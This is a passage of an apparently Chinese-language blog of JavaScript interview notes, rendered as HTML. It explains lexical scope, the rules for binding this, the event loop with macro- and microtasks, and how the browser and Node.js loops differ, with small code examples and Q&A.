function_">log</span>(globalVar); <span class="hljs-comment">// 全局作用域</span><br>  &#125;<br>  <br>  <span class="hljs-title function_">inner</span>();<br>&#125;<br><br><span class="hljs-title function_">outer</span>();<br></code></pre></td></tr></table></figure><p><strong>词法作用域（静态作用域）</strong></p><ul><li>JavaScript 采用词法作用域，作用域在函数定义时就确定了</li><li>与调用位置无关</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">var</span> a = <span class="hljs-string">&#x27;global&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">bar</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">var</span> a = <span class="hljs-string">&#x27;local&#x27;</span>;<br>  <span class="hljs-title function_">foo</span>(); <span class="hljs-comment">// 输出 &quot;global&quot; 而不是 &quot;local&quot;</span><br>&#125;<br><br><span class="hljs-title function_">bar</span>();<br></code></pre></td></tr></table></figure><h2 id="this-指向"><a href="#this-指向" class="headerlink" title="this 指向"></a>this 指向</h2><p><strong>基本概念</strong></p><ul><li>this 是一个特殊的对象，指向当前执行上下文</li><li>this 的值取决于函数的调用方式</li></ul><p><strong>this 的绑定规则</strong></p><p>（1）默认绑定</p><ul><li>独立函数调用时，this 指向全局对象</li><li>严格模式下为 undefined</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>); <span class="hljs-comment">// 浏览器中指向 window</span><br>&#125;<br><span class="hljs-title function_">foo</span>();<br></code></pre></td></tr></table></figure><p>（2）隐士绑定</p><ul><li>作为对象方法调用时，this 指向调用对象</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span>,<br>  <span class="hljs-attr">sayName</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>  &#125;<br>&#125;;<br><br>obj.<span class="hljs-title function_">sayName</span>(); <span class="hljs-comment">// &quot;Alice&quot; (this 指向 obj)</span><br></code></pre></td></tr></table></figure><p>（3）显示绑定</p><ul><li>使用 call、apply、bind 强制指定 this</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hello, <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>`</span>);<br>&#125;<br><br><span class="hljs-keyword">const</span> person = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Bob&#x27;</span> &#125;;<br><br>greet.<span class="hljs-title function_">call</span>(person); <span class="hljs-comment">// &quot;Hello, Bob&quot;</span><br></code></pre></td></tr></table></figure><p>（4）new 绑定</p><ul><li>构造函数调用时，this 指向新创建的对象</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>&#125;<br><br><span class="hljs-keyword">const</span> p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;Charlie&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p.<span class="hljs-property">name</span>); <span class="hljs-comment">// &quot;Charlie&quot;</span><br></code></pre></td></tr></table></figure><p>（5）箭头函数</p><ul><li>箭头函数没有自己的 this，继承外层作用域的 this</li><li>无法通过 call、apply、bind 改变</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Dave&#x27;</span>,<br>  <span class="hljs-attr">sayName</span>: <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>); <span class="hljs-comment">// 指向外层 this (可能是 window)</span><br>  &#125;<br>&#125;;<br><br>obj.<span class="hljs-title function_">sayName</span>(); <span class="hljs-comment">// 可能输出 undefined</span><br></code></pre></td></tr></table></figure><p><strong>this 的特殊情况</strong></p><p>（1）回调函数中的 this</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Eve&#x27;</span>,<br>  <span class="hljs-attr">delayedGreet</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>); <span class="hljs-comment">// this 指向 window/undefined</span><br>    &#125;, <span class="hljs-number">100</span>);<br>  &#125;<br>&#125;;<br><br>obj.<span class="hljs-title function_">delayedGreet</span>(); <span class="hljs-comment">// 输出空或 undefined</span><br></code></pre></td></tr></table></figure><p>解决方法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 使用箭头函数</span><br><span class="hljs-attr">delayedGreet</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>); <span class="hljs-comment">// 继承外层 this</span><br>  &#125;, <span class="hljs-number">100</span>);<br>&#125;<br><br><span class="hljs-comment">// 或保存 this</span><br><span class="hljs-attr">delayedGreet</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> self = <span class="hljs-variable language_">this</span>;<br>  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(self.<span class="hljs-property">name</span>);<br>  &#125;, <span class="hljs-number">100</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>（2）DOM 事件处理函数</p><ul><li>事件处理函数中的 this 指向触发事件的元素</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">button.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>); <span class="hljs-comment">// 指向 button 元素</span><br>&#125;);<br></code></pre></td></tr></table></figure><h2 id="三者的关系与区别"><a href="#三者的关系与区别" class="headerlink" title="三者的关系与区别"></a>三者的关系与区别</h2><table><thead><tr><th align="left">特性</th><th align="left">作用域</th><th align="left">作用域链</th><th align="left">this指向</th></tr></thead><tbody><tr><td align="left">定义</td><td align="left">变量的可访问范围</td><td align="left">变量查找的链式结构</td><td align="left">当前执行上下文对象</td></tr><tr><td align="left">确定时机</td><td align="left">代码编写时（词法作用域）</td><td align="left">函数定义时</td><td align="left">函数调用时</td></tr><tr><td align="left">影响因素</td><td align="left">变量声明位置</td><td align="left">函数嵌套层级</td><td align="left">调用方式</td></tr><tr><td align="left">修改方式</td><td align="left">无法动态修改</td><td align="left">无法动态修改</td><td align="left">call&#x2F;apply&#x2F;bind&#x2F;new</td></tr><tr><td align="left">箭头函数</td><td align="left">遵守块级作用域</td><td align="left">正常形成作用域链</td><td align="left">继承外层 this</td></tr></tbody></table><h2 id="面试常见问题-3"><a href="#面试常见问题-3" class="headerlink" title="面试常见问题"></a>面试常见问题</h2><p><strong>Q：vary、let、const 的作用域区别？</strong></p><ul><li>var：函数作用域，会变量提升</li><li>let&#x2F;const：块级作用域，有暂时性死区（TDZ）</li></ul><p><strong>Q：什么是闭包？它与作用域链有什么关系？</strong></p><p>闭包是可以访问自由变量的函数，它通过作用域链访问外层变量，即使外层函数已经执行完毕</p><p><strong>Q：箭头函数为什么不能用作构造函数？</strong></p><p>箭头函数没有自己的 this，也没有 prototype 属性</p><p><strong>Q：如何改变 this 指向？</strong></p><p>通过 call、apply、bind、new 或箭头函数等方式</p><p><strong>Q：以下代码的输出？</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">var</span> name = <span class="hljs-string">&#x27;Global&#x27;</span>;<br><span class="hljs-keyword">const</span> obj = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Object&#x27;</span>,<br>  <span class="hljs-attr">sayName</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>  &#125;,<br>  <span class="hljs-attr">sayNameArrow</span>: <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>  &#125;<br>&#125;;<br><br>obj.<span class="hljs-title function_">sayName</span>();       <span class="hljs-comment">// ?</span><br>obj.<span class="hljs-title function_">sayNameArrow</span>();  <span class="hljs-comment">// ?</span><br><span class="hljs-keyword">const</span> fn = obj.<span class="hljs-property">sayName</span>;<br><span class="hljs-title function_">fn</span>();                <span class="hljs-comment">// ?</span><br></code></pre></td></tr></table></figure><p>答案：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-string">&quot;Object&quot;</span>  (隐式绑定)<br><span class="hljs-string">&quot;Global&quot;</span>  (箭头函数继承全局 <span class="hljs-variable language_">this</span>)<br><span class="hljs-string">&quot;Global&quot;</span>  (默认绑定)<br></code></pre></td></tr></table></figure><p><strong>Q：全局作用域中的变量会形成闭包引用吗？</strong></p><p>严格来说，全局变量不会形成真正的闭包引用。闭包是指函数能够访问并保持对其词法作用域（通常是外部函数作用域）变量的引用，而全局变量本身就存在于全局作用域中，任何函数都可以直接访问，不需要特殊的闭包机制来保持这些变量的存在</p><p><strong>Q：全局作用域内使用 let 声明的变量，算块级作用域还是全局作用域？</strong></p><p>全局作用域内使用 let 声明的变量具有双重特性：从作用范围来看它是全局的，因为在任何地方都可以访问；从绑定行为上来看它保持了块级作用域的特性，包括暂时性死区、不会成为全局对象（比如 window）的属性。这种设计既保证了变量的全局可用性，又避免了传统 var 声明变量带来的全局污染问题</p><h1 id="事件循环和消息队列"><a href="#事件循环和消息队列" class="headerlink" title="事件循环和消息队列"></a>事件循环和消息队列</h1><h2 id="事件循环的本质与必要性"><a href="#事件循环的本质与必要性" class="headerlink" title="事件循环的本质与必要性"></a>事件循环的本质与必要性</h2><p><strong>为什么需要事件循环？</strong></p><p>JavaScript 采用单线程模型设计，主要基于以下几点考虑：</p><ul><li>DOM 操作的一致性：多线程同时操作 DOM 会带来不可预期的结果</li><li>简化编程模型：避免了多线程编程中的复杂性，比如死锁、资源竞争等</li><li>适合 web 应用场景：web 应用主要是 I&#x2F;O 密集型而非计算密集型</li></ul><p>而采用单线程模型设计，就意味着所有任务必须排队等待执行，如果前一个任务执行时间过长，就会阻塞后续任务。事件循环机制解决了这个问题，使得JavaScript 能够实现非阻塞的异步操作</p><p><strong>事件循环的定义</strong><br>事件循环是 JavaScript 运行时对任务调度的实现方式，它协调同步代码执行、异步回调处理、UI 渲染等操作。本质上，事件循环是一个不断检查任务队列并执行任务的循环过程</p><h2 id="事件循环的核心组成"><a href="#事件循环的核心组成" class="headerlink" title="事件循环的核心组成"></a>事件循环的核心组成</h2><p><strong>调用栈（Call Stack）</strong></p><p>调用栈是存储函数调用的栈结构，遵循“后进先出”原则。当函数被调用时会被压入栈顶，执行完毕后从栈顶弹出</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;foo&#x27;</span>);<br>  <span class="hljs-title function_">bar</span>();<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">bar</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;bar&#x27;</span>);<br>&#125;<br><br><span class="hljs-title function_">foo</span>();<br></code></pre></td></tr></table></figure><p>上述代码的调用栈变化：</p><ol><li>foo()入栈</li><li>console.log(‘foo’)入栈并执行，然后出栈</li><li>bar()入栈</li><li>console.log(‘bar’)入栈并执行，然后出栈</li><li>bar()出栈</li><li>foo()出栈</li></ol><p><strong>任务队列（Task Queue）</strong></p><p>任务队列是一种先进先出（FIFO）的数据结构，用于存储待执行的异步任务回调，当 JavaScript 主线程执行完当前调用栈中的任务后，会从任务队列中取出下一个任务执行。任务队列分为三类：</p><p>（1）宏任务队列（MacroTask Queue）</p><ul><li>script（整体代码）</li><li>setTimeout&#x2F;setInterval</li><li>I&#x2F;O 操作</li><li>UI 渲染</li><li>MessageChannel</li><li>setImmediate（Node.js）</li></ul><p>每次事件循环只执行一个宏任务</p><p>（2）微任务队列（MicroTask Queue）</p><ul><li>Promise.then&#x2F;catch&#x2F;finally</li><li>MutationObeserver</li><li>queueMicrotask</li><li>process.nextTick（Node.js，优先级最高）</li></ul><p>每次事件循环会清空整个微任务队列</p><p>（3）其他特殊队列</p><ul><li>requestAnimationFrame（浏览器）</li><li>requestIdleCallback（浏览器）</li><li>I&#x2F;O 回调队列：Node.js 特有的 I&#x2F;O 相关回调</li></ul><p><strong>Web APIs</strong></p><p>浏览器提供的异步 API，如 DOM 点击事件、Ajax、setTimeout 等，这些 API 由浏览器的其他线程处理，完成后将回调放入任务队列</p><h2 id="事件循环的详细工作流程"><a href="#事件循环的详细工作流程" class="headerlink" title="事件循环的详细工作流程"></a>事件循环的详细工作流程</h2><p><strong>完整执行顺序</strong></p><ol><li>执行同步代码：从 script（整体代码）开始，依次执行所有同步任务</li><li>检查微任务队列：执行栈为空后，依次执行所有微任务，如果微任务执行过程中又产生了新的微任务，会继续执行新产生的微任务，直到微任务队列清空</li><li>UI 渲染（浏览器环境）：更新界面</li><li>执行一个宏任务：从宏任务队列中取出最早的一个任务执行</li><li>重复步骤 2～4，形成循环</li></ol><p><strong>关键特性</strong></p><ul><li>微任务的优先级高于宏任务：每执行完一个宏任务后，会清空微任务队列</li><li>微任务插队机制：微任务可以插入当前执行栈栈尾</li><li>任务嵌套的处理：微任务执行过程中产生的新的微任务会在当前周期内继续执行，宏任务中产生的任务会在进入队列等待下一轮执行</li><li>渲染时机：浏览器通常会在宏任务之间执行渲染</li></ul><p><strong>代码示例分析</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;script start&#x27;</span>);<br><br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;setTimeout&#x27;</span>);<br>  <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;promise in setTimeout&#x27;</span>);<br>  &#125;);<br>&#125;, <span class="hljs-number">0</span>);<br><br><span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;promise1&#x27;</span>);<br>&#125;).<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;promise2&#x27;</span>);<br>&#125;);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;script end&#x27;</span>);<br><br><span class="hljs-comment">/* 输出顺序：</span><br><span class="hljs-comment">script start</span><br><span class="hljs-comment">script end</span><br><span class="hljs-comment">promise1</span><br><span class="hljs-comment">promise2</span><br><span class="hljs-comment">setTimeout</span><br><span class="hljs-comment">promise in setTimeout</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>执行过程分析：</p><ol><li><p>同步代码执行：打印 “script start“ 和 “script end“</p></li><li><p>setTimeout 回调进入宏任务队列</p></li><li><p>Promise.then 回调进入微任务队列</p></li><li><p>同步代码执行完毕，执行微任务队列：</p><ul><li>打印 “promise1“，第二个 then 进入微任务队列</li><li>打印 “promise2“</li></ul></li><li><p>执行宏任务队列中的 setTimeout 回调：</p><ul><li>打印 “setTimeout“</li><li>Promise.then 回调进入微任务队列</li></ul></li><li><p>再次检查微任务队列，打印“promise in setTimeout”</p></li></ol><h2 id="浏览器与Node-js事件循环差异"><a href="#浏览器与Node-js事件循环差异" class="headerlink" title="浏览器与Node.js事件循环差异"></a>浏览器与Node.js事件循环差异</h2><p><strong>浏览器事件循环特点</strong></p><ol><li>阶段简单：主要分为宏任务执行、微任务执行、UI 渲染三个阶段</li><li>任务类型：宏任务和微任务</li><li>渲染时机：在宏任务之间可能进行 UI 渲染</li></ol><p><strong>Node.js 事件循环特点</strong><br>Node.js 使用 libuv 库实现事件循环，分为六个阶段：</p><ol><li>timers：执行 setTimeout 和 setInterval 回调</li><li>pending callbacks：执行系统操作（如 TCP 错误）的回调</li><li>idle，prepare：仅 Node 内部使用</li><li>poll：检索新的 I&#x2F;O 事件；执行与 I&#x2F;O 相关的回调（除了 close、timers 和 setImmediate）；可能会阻塞等待新事件</li><li>check：执行 setImmediate 回调</li><li>close callback：执行关闭事件的回调（如 socket.on(‘close’)）</li></ol><p><strong>关键区别对比</strong></p><table><thead><tr><th align="left">特性</th><th align="left">浏览器</th><th align="left">Node.js</th></tr></thead><tbody><tr><td align="left">实现基础</td><td align="left">浏览器引擎</td><td align="left">libuv 库</td></tr><tr><td align="left">阶段划分</td><td align="left">宏任务、微任务、UI 渲染</td><td align="left">6 个明确阶段</td></tr><tr><td align="left">setImmediate</td><td align="left">仅 IE 支持</td><td align="left">标准 API</td></tr><tr><td align="left">process.nextTick</td><td align="left">不支持</td><td align="left">最高优先级微任务</td></tr><tr><td align="left">I&#x2F;O 处理</td><td align="left">Web APIs</td><td align="left">libuv 线程池</td></tr><tr><td align="left">任务优先级</td><td align="left">微任务优先</td><td align="left">nextTick &gt; 微任务</td></tr></tbody></table><p><strong>Node.js 特殊行为</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// timeout_vs_immediate.js</span><br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;timeout&#x27;</span>);<br>&#125;, <span class="hljs-number">0</span>);<br><br><span class="hljs-title function_">setImmediate</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;immediate&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>在 Node.js 中，上述代码的输出顺序是不确定的，因为受进程性能影响。但在 I&#x2F;O 周期内调用时，setImmediate 总是优先于 setTimeout</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><br>fs.<span class="hljs-title function_">readFile</span>(__filename, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;timeout&#x27;</span>);<br>  &#125;, <span class="hljs-number">0</span>);<br>  <br>  <span class="hljs-title function_">setImmediate</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;immediate&#x27;</span>);<br>  &#125;);<br>&#125;);<br><span class="hljs-comment">// 总是输出: immediate -&gt; timeout</span><br></code></pre></td></tr></table></figure><h2 id="高级应用场景"><a href="#高级应用场景" class="headerlink" title="高级应用场景"></a>高级应用场景</h2><p><strong>Vue.nextTick 实现原理</strong></p><p>Vue 通过微任务队列实现异步 DOM 更新。在浏览器环境中，Vue 会优先使用Promise.then，降级方案包括 mutationObeserver 和 setTimeout</p><p><strong>async&#x2F;await 的执行时机</strong></p><p>async 函数返回 promise，await 实际上会暂停函数执行，将后续代码作为微任务</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">await</span> <span class="hljs-title function_">bar</span>();<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">3</span>); <span class="hljs-comment">// 相当于Promise.then</span><br>&#125;<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">bar</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">2</span>);<br>&#125;<br><br><span class="hljs-title function_">foo</span>();<br><span class="hljs-comment">// 输出: 1, 2, 3</span><br></code></pre></td></tr></table></figure><p><strong>利用 MessageChannel 实现高优先级异步</strong></p><p>MessageChannel 的回调作为宏任务，但优先级高于 setTimeout</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> channel = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageChannel</span>();<br>channel.<span class="hljs-property">port1</span>.<span class="hljs-property">onmessage</span> = <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;MessageChannel callback&#x27;</span>);<br>&#125;;<br>channel.<span class="hljs-property">port2</span>.<span class="hljs-title function_">postMessage</span>(<span class="hljs-literal">null</span>);<br><br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;setTimeout&#x27;</span>);<br>&#125;, <span class="hljs-number">0</span>);<br><br><span class="hljs-comment">// 输出顺序: MessageChannel callback -&gt; setTimeout</span><br></code></pre></td></tr></table></figure><h2 id="面试常见问题-4"><a href="#面试常见问题-4" class="headerlink" title="面试常见问题"></a>面试常见问题</h2><p><strong>Q：setTimeout(fn, 0)是立即执行吗？</strong></p><p>不是，它表示”尽快执行“，但要等到：</p><ol><li>当前同步代码执行完</li><li>所有微任务执行完</li><li>可能还要等待 UI 渲染</li></ol><p><strong>Q：为什么 promise 是微任务？</strong></p><p>为了确保异步回调的高优先级执行，避免被其他宏任务延迟</p><p><strong>Q：如何理解 “JavaScript 是单线程“？</strong></p><p>JavaScript 只有一个主线程执行调用栈中的代码，但浏览器是多线程的（如网络请求、定时器等由其他线程处理）</p><h1 id="JavaScript-垃圾回收机制"><a href="#JavaScript-垃圾回收机制" class="headerlink" title="JavaScript 垃圾回收机制"></a>JavaScript 垃圾回收机制</h1><h2 id="内存管理基础"><a href="#内存管理基础" class="headerlink" title="内存管理基础"></a>内存管理基础</h2><h3 id="内存生命周期"><a href="#内存生命周期" class="headerlink" title="内存生命周期"></a>内存生命周期</h3><p>JavaScript 内存管理遵循以下生命周期：</p><ul><li>分配分配：当创建变量、函数或对象时自动分配</li><li>使用内存：对内存进行读写操作</li><li>释放内存：当内存不再被需要时，通过垃圾回收机制自动释放</li></ul><h3 id="内存分配机制"><a href="#内存分配机制" class="headerlink" title="内存分配机制"></a>内存分配机制</h3><p>JavaScript 